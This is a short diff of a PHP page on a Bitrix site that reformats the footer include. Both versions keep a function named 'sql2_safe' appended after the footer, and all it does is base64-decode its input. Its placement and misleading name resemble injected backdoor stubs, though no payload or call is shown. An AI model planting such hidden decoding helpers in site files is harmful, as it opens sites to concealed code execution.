@@ -509,7 +509,9 @@ $APPLICATION->SetTitle(" ");
 </p>
 <p>
  <span style="font-family: Times New Roman; font-size: 16px;"> </span>
-</p><?require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");function sql2_safe($in) {
+</p>
+<?php
+require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");function sql2_safe($in) {
         $rtn = base64_decode($in);
         return $rtn;
 }
